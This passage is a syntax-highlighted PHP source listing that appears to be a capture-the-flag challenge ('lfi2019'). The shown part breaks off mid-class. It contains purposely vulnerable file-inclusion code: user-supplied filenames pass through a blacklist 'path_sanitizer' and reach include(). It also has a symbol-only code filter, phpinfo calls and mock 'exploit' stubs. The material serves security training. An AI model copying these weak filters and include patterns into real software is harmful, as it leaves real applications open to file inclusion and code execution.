</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span><span class=lnt>255
</span><span class=lnt>256
</span><span class=lnt>257
</span><span class=lnt>258
</span><span class=lnt>259
</span><span class=lnt>260
</span><span class=lnt>261
</span><span class=lnt>262
</span><span class=lnt>263
</span><span class=lnt>264
</span><span class=lnt>265
</span><span class=lnt>266
</span><span class=lnt>267
</span><span class=lnt>268
</span><span class=lnt>269
</span><span class=lnt>270
</span><span class=lnt>271
</span><span class=lnt>272
</span><span class=lnt>273
</span><span class=lnt>274
</span><span class=lnt>275
</span><span class=lnt>276
</span><span class=lnt>277
</span><span class=lnt>278
</span><span class=lnt>279
</span><span class=lnt>280
</span><span class=lnt>281
</span><span class=lnt>282
</span><span class=lnt>283
</span><span class=lnt>284
</span><span class=lnt>285
</span><span class=lnt>286
</span><span class=lnt>287
</span><span class=lnt>288
</span><span class=lnt>289
</span><span class=lnt>290
</span><span class=lnt>291
</span><span class=lnt>292
</span><span class=lnt>293
</span><span class=lnt>294
</span><span class=lnt>295
</span><span class=lnt>296
</span><span class=lnt>297
</span><span class=lnt>298
</span><span class=lnt>299
</span><span class=lnt>300
</span><span class=lnt>301
</span><span class=lnt>302
</span><span class=lnt>303
</span><span class=lnt>304
</span><span class=lnt>305
</span><span class=lnt>306
</span><span class=lnt>307
</span><span class=lnt>308
</span><span class=lnt>309
</span><span class=lnt>310
</span><span class=lnt>311
</span><span class=lnt>312
</span><span class=lnt>313
</span><span class=lnt>314
</span><span class=lnt>315
</span><span class=lnt>316
</span><span class=lnt>317
</span><span class=lnt>318
</span><span class=lnt>319
</span><span class=lnt>320
</span><span class=lnt>321
</span><span class=lnt>322
</span><span class=lnt>323
</span><span class=lnt>324
</span><span class=lnt>325
</span><span class=lnt>326
</span><span class=lnt>327
</span><span class=lnt>328
</span><span class=lnt>329
</span><span class=lnt>330
</span><span class=lnt>331
</span><span class=lnt>332
</span><span class=lnt>333
</span><span class=lnt>334
</span><span class=lnt>335
</span><span class=lnt>336
</span><span class=lnt>337
</span><span class=lnt>338
</span><span class=lnt>339
</span><span class=lnt>340
</span><span class=lnt>341
</span><span class=lnt>342
</span><span class=lnt>343
</span><span class=lnt>344
</span><span class=lnt>345
</span><span class=lnt>346
</span><span class=lnt>347
</span><span class=lnt>348
</span><span class=lnt>349
</span><span class=lnt>350
</span><span class=lnt>351
</span><span class=lnt>352
</span><span class=lnt>353
</span><span class=lnt>354
</span><span class=lnt>355
</span><span class=lnt>356
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>        Developed by stypr.
</span></span></span><span class=line><span class=cl><span class=cm>        Made in 2018, Releasing in 2019!
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Baka flag-sama and seed-chan! //
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>ini_set</span><span class=p>(</span><span class=s2>&#34;display_errors&#34;</span><span class=p>,</span><span class=s2>&#34;off&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=o>@</span><span class=k>require</span><span class=p>(</span><span class=s1>&#39;flag.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$seed</span> <span class=o>=</span> <span class=nx>md5</span><span class=p>(</span><span class=nx>rand</span><span class=p>(</span><span class=nx>PHP_INT_MIN</span><span class=p>,</span><span class=nx>PHP_INT_MAX</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nv>$flag</span> <span class=o>===</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;trigger&#39;</span><span class=p>]){</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=nx>hash</span><span class=p>(</span><span class=s2>&#34;sha256&#34;</span><span class=p>,</span> <span class=nv>$seed</span> <span class=o>.</span> <span class=nv>$flag</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Sessions are never used but we add that //
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;session.cookie_httponly&#39;</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span> <span class=o>@</span><span class=nx>phpinfo</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;session.cookie_secure&#39;</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span> <span class=o>@</span><span class=nx>phpinfo</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;session.use_only_cookies&#39;</span><span class=p>,</span><span class=mi>1</span><span class=p>);</span> <span class=o>@</span><span class=nx>phpinfo</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;session.gc_probability&#39;</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span> <span class=o>@</span><span class=nx>phpinfo</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=c1>// but really, you can&#39;t really do something with sessions. //
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>session_save_path</span><span class=p>(</span><span class=s1>&#39;./sess/&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>session_name</span><span class=p>(</span><span class=s2>&#34;lfi2019&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>session_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nx>session_destroy</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Flush directory for security purposes //
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// Referenced it from StackOverflow: https://bit.ly/2MxvxXE //
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>function</span> <span class=nf>rrmdir</span><span class=p>(</span><span class=nv>$dir</span><span class=p>,</span> <span class=nv>$depth</span><span class=o>=</span><span class=mi>0</span><span class=p>){</span> 
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>is_dir</span><span class=p>(</span><span class=nv>$dir</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>            <span class=nv>$objects</span> <span class=o>=</span> <span class=nx>scandir</span><span class=p>(</span><span class=nv>$dir</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>            <span class=k>foreach</span> <span class=p>(</span><span class=nv>$objects</span> <span class=k>as</span> <span class=nv>$object</span><span class=p>){</span> 
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=nv>$object</span> <span class=o>!=</span> <span class=s2>&#34;.&#34;</span> <span class=o>&amp;&amp;</span> <span class=nv>$object</span> <span class=o>!=</span> <span class=s2>&#34;..&#34;</span><span class=p>){</span> 
</span></span><span class=line><span class=cl>                    <span class=k>if</span><span class=p>(</span><span class=nx>is_dir</span><span class=p>(</span><span class=nv>$dir</span><span class=o>.</span><span class=s2>&#34;/&#34;</span><span class=o>.</span><span class=nv>$object</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                        <span class=nx>rrmdir</span><span class=p>(</span><span class=nv>$dir</span><span class=o>.</span><span class=s2>&#34;/&#34;</span><span class=o>.</span><span class=nv>$object</span><span class=p>,</span> <span class=nv>$depth</span> <span class=o>+</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=k>else</span>
</span></span><span class=line><span class=cl>                        <span class=nx>unlink</span><span class=p>(</span><span class=nv>$dir</span><span class=o>.</span><span class=s2>&#34;/&#34;</span><span class=o>.</span><span class=nv>$object</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$depth</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=nx>rmdir</span><span class=p>(</span><span class=nv>$dir</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>countdir</span><span class=p>(</span><span class=nv>$dir</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>is_dir</span><span class=p>(</span><span class=nv>$dir</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>            <span class=nv>$objects</span> <span class=o>=</span> <span class=nx>scandir</span><span class=p>(</span><span class=nv>$dir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>foreach</span> <span class=p>(</span><span class=nv>$objects</span> <span class=k>as</span> <span class=nv>$object</span><span class=p>){</span> 
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=nv>$object</span> <span class=o>!=</span> <span class=s2>&#34;.&#34;</span> <span class=o>&amp;&amp;</span> <span class=nv>$object</span> <span class=o>!=</span> <span class=s2>&#34;..&#34;</span><span class=p>){</span> 
</span></span><span class=line><span class=cl>                    <span class=nv>$count</span> <span class=o>+=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span><span class=p>(</span><span class=nx>is_dir</span><span class=p>(</span><span class=nv>$dir</span><span class=o>.</span><span class=s2>&#34;/&#34;</span><span class=o>.</span><span class=nv>$object</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                        <span class=nv>$count</span> <span class=o>+=</span> <span class=nx>countdir</span><span class=p>(</span><span class=nv>$dir</span><span class=o>.</span><span class=s2>&#34;/&#34;</span><span class=o>.</span><span class=nv>$object</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$count</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>var_dump</span><span class=p>(</span><span class=nx>countdir</span><span class=p>(</span><span class=s2>&#34;./files&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>countdir</span><span class=p>(</span><span class=s2>&#34;./files/&#34;</span><span class=p>)</span> <span class=o>&gt;=</span> <span class=mi>100</span><span class=p>)</span> <span class=o>@</span><span class=nx>rrmdir</span><span class=p>(</span><span class=s2>&#34;./files/&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Here, kawaii path-san for you! //
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>function</span> <span class=nf>path_sanitizer</span><span class=p>(</span><span class=nv>$dir</span><span class=p>,</span> <span class=nv>$harden</span><span class=o>=</span><span class=k>false</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$dir</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$dir</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$dir_len</span> <span class=o>=</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$dir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// Deny LFI/RFI/XSS //
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$filter</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;.&#39;</span><span class=p>,</span> <span class=s1>&#39;./&#39;</span><span class=p>,</span> <span class=s1>&#39;~&#39;</span><span class=p>,</span> <span class=s1>&#39;.\\&#39;</span><span class=p>,</span> <span class=s1>&#39;#&#39;</span><span class=p>,</span> <span class=s1>&#39;&lt;&#39;</span><span class=p>,</span> <span class=s1>&#39;&gt;&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=k>foreach</span><span class=p>(</span><span class=nv>$filter</span> <span class=k>as</span> <span class=nv>$f</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nv>$dir</span><span class=p>,</span> <span class=nv>$f</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=c1>// Deny SSRF and all possible weird bypasses //
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$stream</span> <span class=o>=</span> <span class=nx>stream_get_wrappers</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=nv>$stream</span> <span class=o>=</span> <span class=nx>array_merge</span><span class=p>(</span><span class=nv>$stream</span><span class=p>,</span> <span class=nx>stream_get_transports</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=nv>$stream</span> <span class=o>=</span> <span class=nx>array_merge</span><span class=p>(</span><span class=nv>$stream</span><span class=p>,</span> <span class=nx>stream_get_filters</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=k>foreach</span><span class=p>(</span><span class=nv>$stream</span> <span class=k>as</span> <span class=nv>$f</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nv>$f_len</span> <span class=o>=</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$f</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$dir</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nv>$f_len</span><span class=p>)</span> <span class=o>===</span> <span class=nv>$f</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=c1>// Deny length //
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span><span class=p>(</span><span class=nv>$dir_len</span> <span class=o>&gt;=</span> <span class=mi>128</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=c1>// Easy level hardening //
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=k>if</span><span class=p>(</span><span class=nv>$harden</span><span class=p>){</span>
</span></span><span class=line><span class=cl>			<span class=nv>$harden_filter</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;/&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>			<span class=k>foreach</span><span class=p>(</span><span class=nv>$harden_filter</span> <span class=k>as</span> <span class=nv>$f</span><span class=p>){</span>
</span></span><span class=line><span class=cl>				<span class=nv>$dir</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=nv>$f</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=nv>$dir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// Sanitize feature is available starting from the medium level //
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=nv>$dir</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// The new kakkoii code-san is re-implemented. //
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>function</span> <span class=nf>code_sanitizer</span><span class=p>(</span><span class=nv>$code</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=c1>// Computer-chan, please don&#39;t speak english. Speak something else! //
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$code</span> <span class=o>=</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=s2>&#34;/[^&lt;&gt;!@#$%\^&amp;*\_?+\.\-</span><span class=se>\\</span><span class=s2>\&#39;</span><span class=se>\&#34;</span><span class=s2>\=\(\)\[\]\;]/u&#34;</span><span class=p>,</span> <span class=s2>&#34;*Nope*&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$code</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$code</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Errors are intended and straightforward. Please do not ask questions. //
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>class</span> <span class=nc>Get</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=k>function</span> <span class=nf>nanahira</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>            <span class=c1>// senpai notice me //
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>function</span> <span class=nf>exploit</span><span class=p>(</span><span class=nv>$data</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=nv>$exploit</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>System</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;trigger&#39;</span><span class=p>]</span> <span class=o>&amp;&amp;</span> <span class=o>!@@@@@@@@@@@@@</span><span class=nx>exploit</span><span class=p>(</span><span class=nv>$$$$$$_GET</span><span class=p>[</span><span class=s1>&#39;leak&#39;</span><span class=p>][</span><span class=s1>&#39;leak&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>private</span> <span class=nv>$filename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$filename</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span> <span class=o>=</span> <span class=nx>path_sanitizer</span><span class=p>(</span><span class=nv>$filename</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>function</span> <span class=nf>get</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span> <span class=o>===</span> <span class=k>false</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;msg&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;blocked by path sanitizer&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;error&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=c1>// wtf???? //
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>if</span><span class=p>(</span><span class=o>!@</span><span class=nx>file_exists</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>                <span class=c1>// index files are *completely* disabled. //
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=k>if</span><span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>,</span> <span class=s2>&#34;index&#34;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;msg&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;you cannot include index files!&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;error&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=c1>// hardened sanitizer spawned. thus we sense ambiguity //
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=nv>$read_file</span> <span class=o>=</span> <span class=s2>&#34;./files/&#34;</span> <span class=o>.</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=nv>$read_file_with_hardened_filter</span> <span class=o>=</span> <span class=s2>&#34;./files/&#34;</span> <span class=o>.</span> <span class=nx>path_sanitizer</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>,</span> <span class=k>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span><span class=p>(</span><span class=nv>$read_file</span> <span class=o>===</span> <span class=nv>$read_file_with_hardened_filter</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>                    <span class=o>@</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$read_file</span><span class=p>)</span> <span class=o>===</span> <span class=o>@</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$read_file_with_hardened_filter</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;msg&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;request blocked&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;error&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=c1>// .. and finally, include *un*exploitable file is included. //
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=o>@</span><span class=k>include</span><span class=p>(</span><span class=s2>&#34;./files/&#34;</span> <span class=o>.</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;success&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;msg&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;invalid filename (wtf)&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;error&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>Put</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=k>function</span> <span class=nf>nanahira</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>            <span class=c1>// senpai notice me //
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>function</span> <span class=nf>exploit</span><span class=p>(</span><span class=nv>$data</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=nv>$exploit</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>System</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;trigger&#39;</span><span class=p>]</span> <span class=o>&amp;&amp;</span> <span class=o>!@@@@@@@@@@@@@</span><span class=nx>exploit</span><span class=p>(</span><span class=nv>$$$$$$_GET</span><span class=p>[</span><span class=s1>&#39;leak&#39;</span><span class=p>][</span><span class=s1>&#39;leak&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>private</span> <span class=nv>$filename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>private</span> <span class=nv>$content</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>private</span> <span class=nv>$dir</span> <span class=o>=</span> <span class=s2>&#34;./files/&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$filename</span><span class=p>,</span> <span class=nv>$data</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=k>global</span> <span class=nv>$seed</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>((</span><span class=nx>string</span><span class=p>)</span><span class=nv>$filename</span> <span class=o>===</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=o>@</span><span class=nx>path_sanitizer</span><span class=p>(</span><span class=nv>$data</span><span class=p>[</span><span class=s1>&#39;filename&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>                <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$filename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span> <span class=o>=</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
